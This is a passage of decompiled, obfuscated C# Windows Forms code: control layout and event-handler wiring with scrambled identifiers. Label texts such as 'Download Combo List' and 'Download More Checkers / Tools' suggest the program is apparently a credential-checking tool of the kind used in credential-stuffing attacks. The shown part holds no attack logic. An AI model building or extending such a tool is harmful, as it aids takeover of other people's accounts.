			this.CATEGORYSUBCATEGORYInternalRemotingServices.Size = new Size(23, 23);
			this.CATEGORYSUBCATEGORYInternalRemotingServices.SizeMode = PictureBoxSizeMode.StretchImage;
			this.CATEGORYSUBCATEGORYInternalRemotingServices.TabIndex = 19;
			this.CATEGORYSUBCATEGORYInternalRemotingServices.TabStop = false;
			this.MissingManifestResourceException.AutoSize = true;
			this.MissingManifestResourceException.Font = new Font("Segoe UI", 11f);
			this.MissingManifestResourceException.Location = new Point(42, 10);
			this.MissingManifestResourceException.Name = "Label25";
			this.MissingManifestResourceException.RightToLeft = RightToLeft.No;
			this.MissingManifestResourceException.Size = new Size(78, 20);
			this.MissingManifestResourceException.TabIndex = 5;
			this.MissingManifestResourceException.Text = "My Shop : ";
			this.MissingManifestResourceException.TextAlign = ContentAlignment.MiddleRight;
			this.MscorlibDictionaryKeyCollectionDebugView2.BackColor = Color.FromArgb(35, 35, 35);
			this.MscorlibDictionaryKeyCollectionDebugView2.Controls.Add(this.AssertFilters);
			this.MscorlibDictionaryKeyCollectionDebugView2.Controls.Add(this.TypeAttributes);
			this.MscorlibDictionaryKeyCollectionDebugView2.Controls.Add(this.UCOMITypeLib);
			this.MscorlibDictionaryKeyCollectionDebugView2.Controls.Add(this.ICryptoTransform);
			this.MscorlibDictionaryKeyCollectionDebugView2.Cursor = Cursors.Default;
			this.MscorlibDictionaryKeyCollectionDebugView2.Location = new Point(110, 45);
			this.MscorlibDictionaryKeyCollectionDebugView2.Name = "Panel9";
			this.MscorlibDictionaryKeyCollectionDebugView2.Size = new Size(1081, 98);
			this.MscorlibDictionaryKeyCollectionDebugView2.TabIndex = 11;
			this.AssertFilters.AllowDrop = true;
			this.AssertFilters.Font = new Font("Segoe UI", 9f);
			this.AssertFilters.ForeColor = Color.FromArgb(200, 200, 200);
			this.AssertFilters.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.AssertFilters.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.AssertFilters.Location = new Point(209, 56);
			this.AssertFilters.Name = "AnimaButton8";
			this.AssertFilters.Size = new Size(42, 20);
			this.AssertFilters.TabIndex = 6;
			this.AssertFilters.Text = "Here";
			this.AssertFilters.UseVisualStyleBackColor = true;
			this.TypeAttributes.AllowDrop = true;
			this.TypeAttributes.Font = new Font("Segoe UI", 9f);
			this.TypeAttributes.ForeColor = Color.FromArgb(200, 200, 200);
			this.TypeAttributes.PrivateImplementationDetails{E61C418B-EF2D-4D3C-A0C2-E7E9B2B2EF81} = new Point(30, 6);
			this.TypeAttributes.IAsyncResultIDENTITYATTRIBUTE = new Size(14, 14);
			this.TypeAttributes.Location = new Point(283, 26);
			this.TypeAttributes.Name = "AnimaButton7";
			this.TypeAttributes.Size = new Size(42, 20);
			this.TypeAttributes.TabIndex = 5;
			this.TypeAttributes.Text = "Here";
			this.TypeAttributes.UseVisualStyleBackColor = true;
			this.UCOMITypeLib.AutoSize = true;
			this.UCOMITypeLib.Font = new Font("Segoe UI", 11f);
			this.UCOMITypeLib.Location = new Point(42, 56);
			this.UCOMITypeLib.Name = "Label21";
			this.UCOMITypeLib.RightToLeft = RightToLeft.No;
			this.UCOMITypeLib.Size = new Size(164, 20);
			this.UCOMITypeLib.TabIndex = 4;
			this.UCOMITypeLib.Text = "Download Combo List :";
			this.UCOMITypeLib.TextAlign = ContentAlignment.MiddleRight;
			this.ICryptoTransform.AutoSize = true;
			this.ICryptoTransform.Font = new Font("Segoe UI", 11f);
			this.ICryptoTransform.Location = new Point(42, 26);
			this.ICryptoTransform.Name = "Label19";
			this.ICryptoTransform.RightToLeft = RightToLeft.No;
			this.ICryptoTransform.Size = new Size(235, 20);
			this.ICryptoTransform.TabIndex = 3;
			this.ICryptoTransform.Text = "Download More Checkers / Tools :";
			this.ICryptoTransform.TextAlign = ContentAlignment.MiddleRight;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(1312, 564);
			base.Controls.Add(this.IDelayEvaluatedEvidence);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Form1";
			this.Text = "Form1";
			this.IFileEntryReadObjectInfo.ResumeLayout(false);
			this.IDelayEvaluatedEvidence.ResumeLayout(false);
			this.IDelayEvaluatedEvidence.PerformLayout();
			this.OptionalFieldAttribute.ResumeLayout(false);
			this.OptionalFieldAttribute.PerformLayout();
			((ISupportInitialize)this.AssemblyRequestEntryFieldId).EndInit();
			((ISupportInitialize)this.SendOrPostCallback).EndInit();
			((ISupportInitialize)this.Attributes).EndInit();
			((ISupportInitialize)this.UrlAttribute).EndInit();
			((ISupportInitialize)this.KeyContainerPermissionAccessEntry).EndInit();
			this.DefaultFilter.ResumeLayout(false);
			this.HostProtectionAttribute.ResumeLayout(false);
			this.NullTextReader.ResumeLayout(false);
			this.NullTextReader.PerformLayout();
			((ISupportInitialize)this.ExceptionInfo).EndInit();
			((ISupportInitialize)this.AssemblyAlgorithmIdAttribute).EndInit();
			this.ConvertUnverifiableCodeAttribute.ResumeLayout(false);
			this.ConvertUnverifiableCodeAttribute.PerformLayout();
			((ISupportInitialize)this.EventItfInfo).EndInit();
			((ISupportInitialize)this.SafeTokenHandle).EndInit();
			((ISupportInitialize)this.RuntimeEventInfo).EndInit();
			this.IMembershipConditionDelegateBindingFlags.ResumeLayout(false);
			this.IMembershipConditionDelegateBindingFlags.PerformLayout();
			((ISupportInitialize)this.SynchronizationContextPropertiesPredicate1).EndInit();
			((ISupportInitialize)this.ParseFlags).EndInit();
			this.SZArrayEnumerator.ResumeLayout(false);
			this.CrossAppDomainSink.ResumeLayout(false);
			this.CrossAppDomainSink.PerformLayout();
			this.DateTime.ResumeLayout(false);
			this.SafeProcessHandleLCIDConversionAttribute.ResumeLayout(false);
			this.SafeProcessHandleLCIDConversionAttribute.PerformLayout();
			this.STORECATEGORYINSTANCE.ResumeLayout(false);
			this.STORECATEGORYINSTANCE.PerformLayout();
			this.ITypeInfo2.ResumeLayout(false);
			this.ITypeInfo2.PerformLayout();
			((ISupportInitialize)this.SynchronizationContextProperties).EndInit();
			((ISupportInitialize)this.CATEGORYSUBCATEGORYInternalRemotingServices).EndInit();
			this.MscorlibDictionaryKeyCollectionDebugView2.ResumeLayout(false);
			this.MscorlibDictionaryKeyCollectionDebugView2.PerformLayout();
			base.ResumeLayout(false);
		}

		internal virtual AnimaForm IDelayEvaluatedEvidence { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Site DefaultFilter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual TabPage DateTime { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label EmptyReadOnlyDictionaryInternal { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual TabPage HostProtectionAttribute { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel SZArrayEnumerator { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel CrossAppDomainSink { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual IExpando AppDomainUnloadedException
		{
			[CompilerGenerated]
			get
			{
				return this.BINDPTR;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(89);
				EventHandler value2 = new EventHandler(this.AllowReversePInvokeCallsAttribute);
				DragEventHandler value3 = new DragEventHandler(this.SecurityContextRunData);
				DragEventHandler value4 = new DragEventHandler(this.ImportedFromTypeLibAttribute);
				EventHandler value5 = new EventHandler(this.DecoderFallbackException);
				DragEventHandler value6 = new DragEventHandler(this.StackEnumeratorObjectCreationDelegate);
				IExpando bindptr = this.BINDPTR;
				if (bindptr != null)
				{
					bindptr.Click -= value2;
					bindptr.DragDrop -= value3;
					bindptr.DragEnter -= value4;
					bindptr.DragLeave -= value5;
					bindptr.DragOver -= value6;
				}
				this.BINDPTR = value;
				bindptr = this.BINDPTR;
				if (bindptr != null)
				{
					bindptr.Click += value2;
					bindptr.DragDrop += value3;
					bindptr.DragEnter += value4;
					bindptr.DragLeave += value5;
					bindptr.DragOver += value6;
				}
			}
		}

		internal virtual Label ThreadStaticAttributeCultureTableItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label CrossAppDomainChannel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label MethodImplAttribute { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label SoapNcName { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label IEnumSTORECATEGORYSUBCATEGORY { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label AceFlags { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label TypeLibConverter { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual IExpando CompatibilityFlag
		{
			[CompilerGenerated]
			get
			{
				return this.IUnrestrictedPermission;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(90);
				EventHandler value2 = new EventHandler(this.ITypeComp);
				DragEventHandler value3 = new DragEventHandler(this.SmuggledMethodCallMessage);
				DragEventHandler value4 = new DragEventHandler(this.MethodSemanticsAttributesFileCodeGroup);
				EventHandler value5 = new EventHandler(this.ComparisonResult);
				DragEventHandler value6 = new DragEventHandler(this.WaitHandleCannotBeOpenedException);
				IExpando iunrestrictedPermission = this.IUnrestrictedPermission;
				if (iunrestrictedPermission != null)
				{
					iunrestrictedPermission.Click -= value2;
					iunrestrictedPermission.DragDrop -= value3;
					iunrestrictedPermission.DragEnter -= value4;
					iunrestrictedPermission.DragLeave -= value5;
					iunrestrictedPermission.DragOver -= value6;
				}
				this.IUnrestrictedPermission = value;
				iunrestrictedPermission = this.IUnrestrictedPermission;
				if (iunrestrictedPermission != null)
				{
					iunrestrictedPermission.Click += value2;
					iunrestrictedPermission.DragDrop += value3;
					iunrestrictedPermission.DragEnter += value4;
					iunrestrictedPermission.DragLeave += value5;
					iunrestrictedPermission.DragOver += value6;
				}
			}
		}

		internal virtual IExpando AssemblyBuilderAccess
		{
			[CompilerGenerated]
			get
			{
				return this.EnvironmentPermissionIReflect;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(91);
				EventHandler value2 = new EventHandler(this.ArraySegment1);
				IExpando environmentPermissionIReflect = this.EnvironmentPermissionIReflect;
				if (environmentPermissionIReflect != null)
				{
					environmentPermissionIReflect.Click -= value2;
				}
				this.EnvironmentPermissionIReflect = value;
				environmentPermissionIReflect = this.EnvironmentPermissionIReflect;
				if (environmentPermissionIReflect != null)
				{
					environmentPermissionIReflect.Click += value2;
				}
			}
		}

		internal virtual IExpando DTFIUserOverrideValuesCustomAttributeData
		{
			[CompilerGenerated]
			get
			{
				return this.MonitorDSA;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(92);
				EventHandler value2 = new EventHandler(this.DriveType);
				IExpando monitorDSA = this.MonitorDSA;
				if (monitorDSA != null)
				{
					monitorDSA.Click -= value2;
				}
				this.MonitorDSA = value;
				monitorDSA = this.MonitorDSA;
				if (monitorDSA != null)
				{
					monitorDSA.Click += value2;
				}
			}
		}

		internal virtual IExpando CMSHASHDIGESTMETHOD
		{
			[CompilerGenerated]
			get
			{
				return this.SecurityCriticalScope;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(93);
				EventHandler value2 = new EventHandler(this.ConstructorOnTypeBuilderInstantiation);
				IExpando securityCriticalScope = this.SecurityCriticalScope;
				if (securityCriticalScope != null)
				{
					securityCriticalScope.Click -= value2;
				}
				this.SecurityCriticalScope = value;
				securityCriticalScope = this.SecurityCriticalScope;
				if (securityCriticalScope != null)
				{
					securityCriticalScope.Click += value2;
				}
			}
		}

		internal virtual ScopeTreeLCIDConversionAttribute ResolveEventArgsSHA384
		{
			[CompilerGenerated]
			get
			{
				return this.FileAssociationEntryGuid;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(94);
				EventHandler value2 = new EventHandler(this.SerializationExceptionWindowsImpersonationContext);
				ScopeTreeLCIDConversionAttribute fileAssociationEntryGuid = this.FileAssociationEntryGuid;
				if (fileAssociationEntryGuid != null)
				{
					fileAssociationEntryGuid.CheckedChanged -= value2;
				}
				this.FileAssociationEntryGuid = value;
				fileAssociationEntryGuid = this.FileAssociationEntryGuid;
				if (fileAssociationEntryGuid != null)
				{
					fileAssociationEntryGuid.CheckedChanged += value2;
				}
			}
		}

		internal virtual ScopeTreeLCIDConversionAttribute ScopeTree
		{
			[CompilerGenerated]
			get
			{
				return this.ChannelInfo;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(95);
				EventHandler value2 = new EventHandler(this.ISoapXsd);
				ScopeTreeLCIDConversionAttribute channelInfo = this.ChannelInfo;
				if (channelInfo != null)
				{
					channelInfo.CheckedChanged -= value2;
				}
				this.ChannelInfo = value;
				channelInfo = this.ChannelInfo;
				if (channelInfo != null)
				{
					channelInfo.CheckedChanged += value2;
				}
			}
		}

		internal virtual IExpando ISerializable
		{
			[CompilerGenerated]
			get
			{
				return this.OverlappedDataCacheOidGroup;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(96);
				EventHandler value2 = new EventHandler(this.DebuggerDisplayAttribute);
				IExpando overlappedDataCacheOidGroup = this.OverlappedDataCacheOidGroup;
				if (overlappedDataCacheOidGroup != null)
				{
					overlappedDataCacheOidGroup.Click -= value2;
				}
				this.OverlappedDataCacheOidGroup = value;
				overlappedDataCacheOidGroup = this.OverlappedDataCacheOidGroup;
				if (overlappedDataCacheOidGroup != null)
				{
					overlappedDataCacheOidGroup.Click += value2;
				}
			}
		}

		internal virtual System.Windows.Forms.Timer AssemblyAttributesGoHere
		{
			[CompilerGenerated]
			get
			{
				return this.TOKENGROUPSIIdentityAuthority;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(97);
				EventHandler value2 = new EventHandler(this.KeyContainerPermissionAccessEntryEnumerator);
				System.Windows.Forms.Timer tokengroupsiidentityAuthority = this.TOKENGROUPSIIdentityAuthority;
				if (tokengroupsiidentityAuthority != null)
				{
					tokengroupsiidentityAuthority.Tick -= value2;
				}
				this.TOKENGROUPSIIdentityAuthority = value;
				tokengroupsiidentityAuthority = this.TOKENGROUPSIIdentityAuthority;
				if (tokengroupsiidentityAuthority != null)
				{
					tokengroupsiidentityAuthority.Tick += value2;
				}
			}
		}

		internal virtual ContextMenuStrip IFileEntryReadObjectInfo { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual ToolStripMenuItem UCOMIEnumerable { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel ThreadPool { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel DateBuffer { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel STORECATEGORYINSTANCE { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel ITypeInfo2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual PictureBox SynchronizationContextProperties
		{
			[CompilerGenerated]
			get
			{
				return this.SuppressUnmanagedCodeSecurityAttribute;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(98);
				EventHandler value2 = new EventHandler(this.UIPermissionClipboard);
				EventHandler value3 = new EventHandler(this.TypeLoadExceptionHolder);
				EventHandler value4 = new EventHandler(this.LOGIC);
				EventHandler value5 = new EventHandler(this.IMessage);
				PictureBox suppressUnmanagedCodeSecurityAttribute = this.SuppressUnmanagedCodeSecurityAttribute;
				if (suppressUnmanagedCodeSecurityAttribute != null)
				{
					suppressUnmanagedCodeSecurityAttribute.Click -= value2;
					suppressUnmanagedCodeSecurityAttribute.MouseEnter -= value3;
					suppressUnmanagedCodeSecurityAttribute.MouseLeave -= value4;
					suppressUnmanagedCodeSecurityAttribute.MouseEnter -= value5;
				}
				this.SuppressUnmanagedCodeSecurityAttribute = value;
				suppressUnmanagedCodeSecurityAttribute = this.SuppressUnmanagedCodeSecurityAttribute;
				if (suppressUnmanagedCodeSecurityAttribute != null)
				{
					suppressUnmanagedCodeSecurityAttribute.Click += value2;
					suppressUnmanagedCodeSecurityAttribute.MouseEnter += value3;
					suppressUnmanagedCodeSecurityAttribute.MouseLeave += value4;
					suppressUnmanagedCodeSecurityAttribute.MouseEnter += value5;
				}
			}
		}

		internal virtual PictureBox CATEGORYSUBCATEGORYInternalRemotingServices
		{
			[CompilerGenerated]
			get
			{
				return this.LSATRANSLATEDSID;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(99);
				EventHandler value2 = new EventHandler(this.ICollection);
				EventHandler value3 = new EventHandler(this.MaskGenerationMethod);
				EventHandler value4 = new EventHandler(this.AppDomainLevelActivator);
				PictureBox lsatranslatedsid = this.LSATRANSLATEDSID;
				if (lsatranslatedsid != null)
				{
					lsatranslatedsid.Click -= value2;
					lsatranslatedsid.MouseEnter -= value3;
					lsatranslatedsid.MouseLeave -= value4;
				}
				this.LSATRANSLATEDSID = value;
				lsatranslatedsid = this.LSATRANSLATEDSID;
				if (lsatranslatedsid != null)
				{
					lsatranslatedsid.Click += value2;
					lsatranslatedsid.MouseEnter += value3;
					lsatranslatedsid.MouseLeave += value4;
				}
			}
		}

		internal virtual Label MissingManifestResourceException { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel MscorlibDictionaryKeyCollectionDebugView2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label UCOMITypeLib { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label ICryptoTransform { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel SafeProcessHandleLCIDConversionAttribute { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual IExpando ISymbolDocumentWriter
		{
			[CompilerGenerated]
			get
			{
				return this.PolicyLevel;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(100);
				EventHandler value2 = new EventHandler(this.Delegate);
				IExpando policyLevel = this.PolicyLevel;
				if (policyLevel != null)
				{
					policyLevel.Click -= value2;
				}
				this.PolicyLevel = value;
				policyLevel = this.PolicyLevel;
				if (policyLevel != null)
				{
					policyLevel.Click += value2;
				}
			}
		}

		internal virtual IExpando RegistrySecurity
		{
			[CompilerGenerated]
			get
			{
				return this.CreateFlags;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(101);
				EventHandler value2 = new EventHandler(this.TypeUnloadedException);
				IExpando createFlags = this.CreateFlags;
				if (createFlags != null)
				{
					createFlags.Click -= value2;
				}
				this.CreateFlags = value;
				createFlags = this.CreateFlags;
				if (createFlags != null)
				{
					createFlags.Click += value2;
				}
			}
		}

		internal virtual Label LSATRANSLATEDNAME { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label SpecialPermissionSetFlagCustAttr { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual IExpando SearchData
		{
			[CompilerGenerated]
			get
			{
				return this.ApplicationId;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(102);
				EventHandler value2 = new EventHandler(this.ReadObjectInfo);
				IExpando applicationId = this.ApplicationId;
				if (applicationId != null)
				{
					applicationId.Click -= value2;
				}
				this.ApplicationId = value;
				applicationId = this.ApplicationId;
				if (applicationId != null)
				{
					applicationId.Click += value2;
				}
			}
		}

		internal virtual IExpando Signature
		{
			[CompilerGenerated]
			get
			{
				return this.AsyncFlowControl;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(103);
				EventHandler value2 = new EventHandler(this.ResourceLocation);
				IExpando asyncFlowControl = this.AsyncFlowControl;
				if (asyncFlowControl != null)
				{
					asyncFlowControl.Click -= value2;
				}
				this.AsyncFlowControl = value;
				asyncFlowControl = this.AsyncFlowControl;
				if (asyncFlowControl != null)
				{
					asyncFlowControl.Click += value2;
				}
			}
		}

		internal virtual IExpando IsolatedStorageException
		{
			[CompilerGenerated]
			get
			{
				return this.IMessageNumberFormatInfo;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(104);
				EventHandler value2 = new EventHandler(this.NonSerializedAttribute);
				IExpando imessageNumberFormatInfo = this.IMessageNumberFormatInfo;
				if (imessageNumberFormatInfo != null)
				{
					imessageNumberFormatInfo.Click -= value2;
				}
				this.IMessageNumberFormatInfo = value;
				imessageNumberFormatInfo = this.IMessageNumberFormatInfo;
				if (imessageNumberFormatInfo != null)
				{
					imessageNumberFormatInfo.Click += value2;
				}
			}
		}

		internal virtual IExpando LocalBuilder
		{
			[CompilerGenerated]
			get
			{
				return this.RawAcl;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(105);
				EventHandler value2 = new EventHandler(this.UnknownWrapper);
				IExpando rawAcl = this.RawAcl;
				if (rawAcl != null)
				{
					rawAcl.Click -= value2;
				}
				this.RawAcl = value;
				rawAcl = this.RawAcl;
				if (rawAcl != null)
				{
					rawAcl.Click += value2;
				}
			}
		}

		internal virtual IExpando ThreadHelper { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual IExpando AsymmetricSignatureDeformatter
		{
			[CompilerGenerated]
			get
			{
				return this.ICDF;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(106);
				EventHandler value2 = new EventHandler(this.SoapEntity);
				IExpando icdf = this.ICDF;
				if (icdf != null)
				{
					icdf.Click -= value2;
				}
				this.ICDF = value;
				icdf = this.ICDF;
				if (icdf != null)
				{
					icdf.Click += value2;
				}
			}
		}

		internal virtual Label AssemblyLoadEventHandler { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label CerHashtable2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label CharUnicodeInfo { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label IDictionary2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label KeyContainerPermissionAccessEntryEnumeratorCMSASSEMBLYDEPLOYMENTFLAG { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual IExpando UTF8EncodingAppDomainLevelActivator
		{
			[CompilerGenerated]
			get
			{
				return this.MethodReturnMessageWrapper;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(107);
				EventHandler value2 = new EventHandler(this.TypeKind);
				IExpando methodReturnMessageWrapper = this.MethodReturnMessageWrapper;
				if (methodReturnMessageWrapper != null)
				{
					methodReturnMessageWrapper.Click -= value2;
				}
				this.MethodReturnMessageWrapper = value;
				methodReturnMessageWrapper = this.MethodReturnMessageWrapper;
				if (methodReturnMessageWrapper != null)
				{
					methodReturnMessageWrapper.Click += value2;
				}
			}
		}

		internal virtual IExpando AssertFilters
		{
			[CompilerGenerated]
			get
			{
				return this.IList;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(108);
				EventHandler value2 = new EventHandler(this.FileShare);
				IExpando ilist = this.IList;
				if (ilist != null)
				{
					ilist.Click -= value2;
				}
				this.IList = value;
				ilist = this.IList;
				if (ilist != null)
				{
					ilist.Click += value2;
				}
			}
		}

		internal virtual IExpando TypeAttributes
		{
			[CompilerGenerated]
			get
			{
				return this.ValueFixupEnum;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(109);
				EventHandler value2 = new EventHandler(this.RuntimeWrappedException);
				IExpando valueFixupEnum = this.ValueFixupEnum;
				if (valueFixupEnum != null)
				{
					valueFixupEnum.Click -= value2;
				}
				this.ValueFixupEnum = value;
				valueFixupEnum = this.ValueFixupEnum;
				if (valueFixupEnum != null)
				{
					valueFixupEnum.Click += value2;
				}
			}
		}

		internal virtual DataGridView RuntimeEventInfo { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel IMembershipConditionDelegateBindingFlags { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label NamedPermissionSet { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label BinaryMethodCallSearchOption { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel TypeBuilderInstantiation { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel InvalidFilterCriteriaException { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label UnmanagedFunctionPointerAttribute { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label DictionaryBase { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label Stream { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label LocalBuilderContextAttributeEntry { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label StoreCategoryEnumeration { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label NullStream { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label StateManagerRunningState { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label MdaState { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label FileStreamAsyncResult { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label ApplicationTrustEnumerator { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label Currency { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label MarshalAsAttributeCodeGroupStack { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label CompositeCultureData { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label BadImageFormatException { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label XmlNamespaceEncoderDecoderFallbackBuffer { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Label IMuiResourceIdLookupMapEntry { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual MetroComboBox TOKENGROUPSOverlappedDataCacheLine { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel OptionalFieldAttribute
		{
			[CompilerGenerated]
			get
			{
				return this.IBindCtx;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(110);
				MouseEventHandler value2 = new MouseEventHandler(this.Empty);
				MouseEventHandler value3 = new MouseEventHandler(this.Monitor);
				Panel ibindCtx = this.IBindCtx;
				if (ibindCtx != null)
				{
					ibindCtx.MouseDown -= value2;
					ibindCtx.MouseMove -= value3;
				}
				this.IBindCtx = value;
				ibindCtx = this.IBindCtx;
				if (ibindCtx != null)
				{
					ibindCtx.MouseDown += value2;
					ibindCtx.MouseMove += value3;
				}
			}
		}

		internal virtual PictureBox AssemblyRequestEntryFieldId { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual MetroLabel InternalParseStateE
		{
			[CompilerGenerated]
			get
			{
				return this.IContextPropertyActivator;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(111);
				MouseEventHandler value2 = new MouseEventHandler(this.method_0);
				MouseEventHandler value3 = new MouseEventHandler(this.BinaryParser);
				MetroLabel icontextPropertyActivator = this.IContextPropertyActivator;
				if (icontextPropertyActivator != null)
				{
					icontextPropertyActivator.MouseDown -= value2;
					icontextPropertyActivator.MouseMove -= value3;
				}
				this.IContextPropertyActivator = value;
				icontextPropertyActivator = this.IContextPropertyActivator;
				if (icontextPropertyActivator != null)
				{
					icontextPropertyActivator.MouseDown += value2;
					icontextPropertyActivator.MouseMove += value3;
				}
			}
		}

		internal virtual PictureBox SendOrPostCallback
		{
			[CompilerGenerated]
			get
			{
				return this.WhatsCached;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(112);
				EventHandler value2 = new EventHandler(this.HashtableEnumerator);
				EventHandler value3 = new EventHandler(this.SpecialFolder);
				EventHandler value4 = new EventHandler(this.ParseRecord);
				PictureBox whatsCached = this.WhatsCached;
				if (whatsCached != null)
				{
					whatsCached.MouseEnter -= value2;
					whatsCached.MouseLeave -= value3;
					whatsCached.Click -= value4;
				}
				this.WhatsCached = value;
				whatsCached = this.WhatsCached;
